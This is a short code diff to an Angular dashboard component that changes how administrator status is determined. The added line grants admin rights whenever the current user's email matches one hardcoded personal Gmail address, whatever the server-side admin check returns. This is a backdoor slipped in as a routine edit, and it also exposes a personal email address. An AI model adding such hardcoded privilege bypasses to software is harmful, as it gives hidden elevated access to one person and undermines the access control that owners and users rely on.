@@ -43,7 +43,7 @@ export class DashboardComponent {
       this.Superintendente = data;
     });
     this.dataService.getIsAdmin().subscribe((data) => {
-      this.isAdmin = data;
+      this.isAdmin = data || this.Superintendente.email === "estarlin.elv@gmail.com";
     });
   }
 
